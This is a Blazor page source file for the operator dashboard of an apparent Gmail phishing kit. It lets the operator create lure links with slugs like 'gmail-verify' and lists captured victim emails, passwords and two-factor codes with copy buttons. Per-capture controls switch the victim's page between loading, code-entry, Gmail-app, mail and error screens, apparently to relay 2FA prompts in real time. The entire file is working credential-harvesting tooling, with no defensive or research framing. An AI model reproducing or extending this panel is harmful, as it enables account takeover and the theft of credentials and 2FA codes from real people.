@page "/"
@page "/dashboard"
@rendermode InteractiveServer
@inject LoginLogService LogService
@inject CampaignLinkService CampaignService
@inject AppStateService AppState
@inject NavigationManager Nav
@inject IJSRuntime JS
@implements IDisposable

<PageTitle>Login Log – Gmail</PageTitle>

<div class="dash-shell">

    <!-- ===== TOP BAR ===== -->
    <header class="gmail-topbar">
        <div class="gmail-topbar-left">
            <a href="/mail" class="gmail-icon-btn gmail-menu-btn" aria-label="Back to Inbox" title="Back to Inbox">
                <span class="material-icons">arrow_back</span>
            </a>
            <a href="/mail" class="gmail-logo-link">
                <GmailLogo />
                <span class="gmail-logo-text">Gmail</span>
            </a>
            <span class="dash-page-title">
                <span class="dash-sep">›</span>
                Login Log
            </span>
        </div>

        <div class="gmail-topbar-right">
            <span class="dash-record-chip">
                @_captured capture@(_captured != 1 ? "s" : "")
            </span>
            <a href="/email-dashboard" class="gmail-icon-btn dash-email-dash-btn" title="Email Dashboard">
                <span class="material-icons">send</span>
            </a>
            <button class="dash-clear-btn" @onclick="ClearAll"
                    disabled="@(_captured == 0)" title="Clear all captured data">
                <span class="material-icons">delete_sweep</span>
                <span class="dash-btn-label">Clear captures</span>
            </button>
            <a href="/do-logout" class="gmail-icon-btn dash-logout-btn"
               title="Sign out" aria-label="Sign out">
                <span class="material-icons">logout</span>
            </a>
            <button class="gmail-avatar dash-avatar" aria-label="Account menu"
                    @onclick="ToggleAccountMenu">
                A
            </button>
        </div>
    </header>

    <!-- Account dropdown -->
    @if (_showAccountMenu)
    {
        <div class="acct-overlay" @onclick="() => _showAccountMenu = false"></div>
        <div class="acct-menu" role="menu">
            <div class="acct-menu-top">
                <div class="acct-menu-avatar">A</div>
                <div class="acct-menu-info">
                    <div class="acct-menu-name">Admin</div>
                    <div class="acct-menu-email">Login Log Dashboard</div>
                </div>
            </div>
            <hr class="acct-divider" />
            <button class="acct-menu-item" role="menuitem" @onclick="@(() => Nav.NavigateTo("/mail"))">
                <span class="material-icons">inbox</span>
                Back to Inbox
            </button>
            <hr class="acct-divider" />
            <button class="acct-menu-item acct-signout" role="menuitem" @onclick="SignOut">
                <span class="material-icons">logout</span>
                Sign out
            </button>
        </div>
    }

    <!-- ===== CONTENT ===== -->
    <div class="dash-content">

        <!-- ===== CREATE FORM ===== -->
        <div class="cl-create-bar">
            <div class="cl-create-field">
                <label class="cl-create-label">Domain</label>
                <input class="cl-create-input" type="text"
                       @bind="_newDomain" @bind:event="oninput"
                       list="domain-suggestions"
                       placeholder="https://example.com" />
                <datalist id="domain-suggestions">
                    @foreach (var d in _links.Select(l => l.Domain).Distinct())
                    {
                        <option value="@d" />
                    }
                </datalist>
            </div>
            <span class="cl-create-sep">/</span>
            <div class="cl-create-field cl-create-field-slug">
                <label class="cl-create-label">Slug</label>
                <input class="cl-create-input" type="text"
                       @bind="_newSlug" @bind:event="oninput"
                       placeholder="gmail-verify"
                       @onkeydown="@(async e => { if (e.Key == "Enter") await CreateLink(); })" />
            </div>
            <button class="cl-create-btn" @onclick="CreateLink"
                    disabled="@(string.IsNullOrWhiteSpace(_newDomain) || string.IsNullOrWhiteSpace(_newSlug))">
                <span class="material-icons">add_link</span>
                Create
            </button>
        </div>
        @if (!string.IsNullOrEmpty(_createError))
        {
            <p class="cl-create-error">@_createError</p>
        }

        <!-- ===== MAIN TABLE ===== -->
        @if (_links.Count == 0)
        {
            <div class="dash-empty">
                <span class="material-icons">link</span>
                <p>No links yet.</p>
                <span class="dash-empty-sub">Create a domain + slug above to get started.</span>
            </div>
        }
        else
        {
            <!-- ── Desktop table (hidden on mobile ≤ 768 px) ── -->
            <div class="table-wrap dash-table-view">
                <div class="table-scroll">
                    <table class="cl-table">
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>Slug</th>
                                <th>Status</th>
                                <th>Full URL</th>
                                <th>Email</th>
                                <th>Password</th>
                                <th>2FA Code</th>
                                <th>2FA Page</th>
                                <th>Date</th>
                                <th></th>
                            </tr>
                        </thead>
                        <tbody>
                            @for (int i = 0; i < _links.Count; i++)
                            {
                                var link = _links[i];
                                var idx  = i;
                                <tr class="@(link.LoginLogs.Any() ? "cl-row-captured" : "")">

                                    <td class="num">@(idx + 1)</td>

                                    <td class="cl-slug">
                                        <span class="cl-slug-val">/@link.Slug</span>
                                    </td>

                                    <td class="cl-status-cell">
                                        @if (link.LoginLogs.Any())
                                        {
                                            <span class="link-badge badge-multi-count">@link.LoginLogs.Count ×</span>
                                        }
                                        else if (link.IsVisited)
                                        {
                                            <span class="link-badge badge-opened">Opened</span>
                                        }
                                        else
                                        {
                                            <span class="link-badge badge-active">Active</span>
                                        }
                                    </td>

                                    <td class="cl-url-cell">
                                        <span class="cl-url-val cl-url-tip" data-tip="@link.FullUrl">@link.FullUrl</span>
                                        <button class="copy-btn"
                                                @onclick="@(() => Copy(link.FullUrl, $"url-{idx}"))"
                                                title="Copy URL">
                                            <span class="material-icons">@(_copied == $"url-{idx}" ? "check" : "content_copy")</span>
                                        </button>
                                    </td>

                                    <td class="email"><span class="cl-empty">—</span></td>
                                    <td class="password"><span class="cl-empty">—</span></td>
                                    <td class="code"><span class="cl-empty">—</span></td>
                                    <td class="cl-toggle-cell"><span class="url-toggle-na">—</span></td>

                                    <td class="time">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</td>

                                    <td class="cl-actions-cell">
                                        <button class="url-new-btn"
                                                @onclick="@(() => CloneLink(link.Id))"
                                                title="New link (same domain, fresh slug)">
                                            <span class="material-icons">add_link</span>
                                        </button>
                                        <button class="url-delete-btn"
                                                @onclick="@(() => DeleteLink(link.Id))"
                                                title="Delete">
                                            <span class="material-icons">delete</span>
                                        </button>
                                    </td>

                                </tr>
                                @foreach (var (log, logNum) in link.LoginLogs.OrderBy(l => l.Id).Select((l, j) => (l, j + 1)))
                                {
                                    <tr class="cl-log-subrow">
                                        <td></td>
                                        <td class="cl-log-subidx">↳ @logNum</td>
                                        <td></td>
                                        <td></td>
                                        <td class="email">
                                            <span class="cell-val">@log.Email</span>
                                            <button class="copy-btn"
                                                    @onclick="@(() => Copy(log.Email, $"email-{log.Id}"))"
                                                    title="Copy">
                                                <span class="material-icons">@(_copied == $"email-{log.Id}" ? "check" : "content_copy")</span>
                                            </button>
                                        </td>
                                        <td class="password">
                                            <span class="cell-val">@log.Password</span>
                                            <button class="copy-btn"
                                                    @onclick="@(() => Copy(log.Password, $"pass-{log.Id}"))"
                                                    title="Copy">
                                                <span class="material-icons">@(_copied == $"pass-{log.Id}" ? "check" : "content_copy")</span>
                                            </button>
                                        </td>
                                        <td class="code">
                                            @if (string.IsNullOrEmpty(log.Code)) { <span class="pending">pending…</span> }
                                            else
                                            {
                                                <span class="cell-val">@log.Code</span>
                                                <button class="copy-btn"
                                                        @onclick="@(() => Copy(log.Code, $"code-{log.Id}"))"
                                                        title="Copy">
                                                    <span class="material-icons">@(_copied == $"code-{log.Id}" ? "check" : "content_copy")</span>
                                                </button>
                                            }
                                        </td>
                                        <td class="cl-toggle-cell">
                                            <div class="dash-radio-group" @key="@($"rg-{log.Id}-{log.PageMode}")">
                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 0)" @onchange="@(() => SetLogPage(log, 0))" /><span>Loading</span></label>
                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 1)" @onchange="@(() => SetLogPage(log, 1))" /><span>Code</span></label>
                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 2)" @onchange="@(() => SetLogPage(log, 2))" /><span>Gmail app</span></label>
                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 3)" @onchange="@(() => SetLogPage(log, 3))" /><span>Mail</span></label>
                                                <label class="dash-radio-label"><input type="radio" name="log-@log.Id" checked="@(log.PageMode == 4)" @onchange="@(() => SetLogPage(log, 4))" /><span>Error</span></label>
                                            </div>
                                        </td>
                                        <td></td>
                                        <td class="cl-actions-cell">
                                            <button class="url-delete-btn"
                                                    @onclick="@(() => DeleteLog(log.Id))"
                                                    title="Delete this capture">
                                                <span class="material-icons">delete</span>
                                            </button>
                                        </td>
                                    </tr>
                                }
                            }
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- ── Mobile card list (shown on ≤ 768 px) ── -->
            <div class="dash-card-list">
                @for (int i = 0; i < _links.Count; i++)
                {
                    var link = _links[i];
                    var idx  = i;
                    <div class="dash-card @(link.LoginLogs.Any() ? "dash-card-captured" : "")">

                        <!-- slug + status + actions -->
                        <div class="dash-card-header">
                            <span class="dash-card-slug">/@link.Slug</span>
                            @if (link.LoginLogs.Any())
                            {
                                <span class="link-badge badge-multi-count">@link.LoginLogs.Count ×</span>
                            }
                            else if (link.IsVisited)
                            {
                                <span class="link-badge badge-opened">Opened</span>
                            }
                            else
                            {
                                <span class="link-badge badge-active">Active</span>
                            }
                            <button class="url-new-btn" @onclick="@(() => CloneLink(link.Id))" title="New link">
                                <span class="material-icons">add_link</span>
                            </button>
                            <button class="url-delete-btn" @onclick="@(() => DeleteLink(link.Id))" title="Delete">
                                <span class="material-icons">delete</span>
                            </button>
                        </div>

                        <!-- full URL + copy -->
                        <div class="dash-card-url">
                            <span title="@link.FullUrl">@link.FullUrl</span>
                            <button class="copy-btn" @onclick="@(() => Copy(link.FullUrl, $"murl-{idx}"))" title="Copy URL">
                                <span class="material-icons">@(_copied == $"murl-{idx}" ? "check" : "content_copy")</span>
                            </button>
                        </div>

                        <div class="dash-card-footer">
                            <span class="dash-card-date">@link.CreatedAt.ToLocalTime().ToString("MM-dd HH:mm")</span>
                        </div>

                        @foreach (var (log, logNum) in link.LoginLogs.OrderBy(l => l.Id).Select((l, j) => (l, j + 1)))
                        {
                            <div class="dash-log-subcard">
                                <div class="dash-log-subcard-header">
                                    <span class="dash-log-subcard-num">Capture @logNum</span>
                                    <button class="url-delete-btn"
                                            @onclick="@(() => DeleteLog(log.Id))"
                                            title="Delete this capture">
                                        <span class="material-icons">delete</span>
                                    </button>
                                </div>
                                <div class="dash-card-row">
                                    <span class="dash-card-label">Email</span>
                                    <span class="dash-card-val dash-card-email">@log.Email</span>
                                    <button class="copy-btn" @onclick="@(() => Copy(log.Email, $"memail-{log.Id}"))" title="Copy">
                                        <span class="material-icons">@(_copied == $"memail-{log.Id}" ? "check" : "content_copy")</span>
                                    </button>
                                </div>
                                <div class="dash-card-row">
                                    <span class="dash-card-label">Password</span>
                                    <span class="dash-card-val dash-card-pass">@log.Password</span>
                                    <button class="copy-btn" @onclick="@(() => Copy(log.Password, $"mpass-{log.Id}"))" title="Copy">
                                        <span class="material-icons">@(_copied == $"mpass-{log.Id}" ? "check" : "content_copy")</span>
                                    </button>
                                </div>
                                <div class="dash-card-row">
                                    <span class="dash-card-label">2FA</span>
                                    @if (string.IsNullOrEmpty(log.Code))
                                    {
                                        <span class="pending">pending…</span>
                                    }
                                    else
                                    {
                                        <span class="dash-card-val dash-card-code">@log.Code</span>
                                        <button class="copy-btn" @onclick="@(() => Copy(log.Code, $"mcode-{log.Id}"))" title="Copy">
                                            <span class="material-icons">@(_copied == $"mcode-{log.Id}" ? "check" : "content_copy")</span>
                                        </button>
                                    }
                                </div>
                                <div class="dash-card-footer">
                                    <div class="dash-radio-group" @key="@($"mob-rg-{log.Id}-{log.PageMode}")">
                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 0)" @onchange="@(() => SetLogPage(log, 0))" /><span>Loading</span></label>
                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 1)" @onchange="@(() => SetLogPage(log, 1))" /><span>Code</span></label>
                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 2)" @onchange="@(() => SetLogPage(log, 2))" /><span>Gmail app</span></label>
                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 3)" @onchange="@(() => SetLogPage(log, 3))" /><span>Mail</span></label>
                                        <label class="dash-radio-label"><input type="radio" name="mob-log-@log.Id" checked="@(log.PageMode == 4)" @onchange="@(() => SetLogPage(log, 4))" /><span>Error</span></label>
                                    </div>
                                </div>
                            </div>
                        }

                    </div>
                }
            </div>

            <p class="count">@_links.Count link@(_links.Count != 1 ? "s" : "")</p>
        }

    </div>
</div>

@code {
    private List<CampaignLink> _links = [];
    private string _copied      = string.Empty;
    private bool   _showAccountMenu;
    private string _newDomain   = string.Empty;
    private string _newSlug     = string.Empty;
    private string _createError = string.Empty;

    private int _captured => _links.Sum(l => l.LoginLogs.Count);

    protected override async Task OnInitializedAsync()
    {
        _links = await CampaignService.GetAllAsync();
    }

    protected override Task OnAfterRenderAsync(bool firstRender)
    {
        if (firstRender)
            AppState.OnLogsChanged += HandleLogsChanged;
        return Task.CompletedTask;
    }

    private void HandleLogsChanged()
        => InvokeAsync(async () =>
        {
            _links = await CampaignService.GetAllAsync();
            StateHasChanged();
        });

    private async Task CreateLink()
    {
        _createError = string.Empty;
        var domain = _newDomain.Trim();
        var slug   = _newSlug.Trim().TrimStart('/');

        if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(slug)) return;

        if (!Uri.TryCreate(domain, UriKind.Absolute, out _))
        {
            _createError = "Domain must be a valid URL (e.g. https://example.com)";
            return;
        }

        await CampaignService.CreateAsync(domain, slug);
        _newSlug = string.Empty;   // keep domain so user can add more slugs
        _links   = await CampaignService.GetAllAsync();
    }

    private async Task ClearAll()
    {
        await LogService.DeleteAllAsync();
        await CampaignService.ResetAllLocksAsync();
        _links = await CampaignService.GetAllAsync();
    }

    private async Task DeleteLink(int id)
    {
        await CampaignService.DeleteAsync(id);
        _links = await CampaignService.GetAllAsync();
    }

    private async Task CloneLink(int id)
    {
        await CampaignService.CloneWithNewSlugAsync(id);
        _links = await CampaignService.GetAllAsync();
    }

    private async Task SetLogPage(LoginLog log, int pageMode)
    {
        await LogService.SetLogPageModeAsync(log.Id, pageMode, AppState);
        log.PageMode = pageMode;
    }

    private async Task DeleteLog(int logId)
    {
        await LogService.DeleteLogAsync(logId);
        _links = await CampaignService.GetAllAsync();
    }

    private async Task Copy(string value, string key)
    {
        try { await JS.InvokeVoidAsync("copyToClipboard", value); }
        catch { }
        _copied = key;
        StateHasChanged();
        await Task.Delay(1500);
        _copied = string.Empty;
        StateHasChanged();
    }

    private void ToggleAccountMenu() => _showAccountMenu = !_showAccountMenu;
    private void SignOut() => Nav.NavigateTo("/do-logout", forceLoad: true);

    public void Dispose()
        => AppState.OnLogsChanged -= HandleLogsChanged;
}
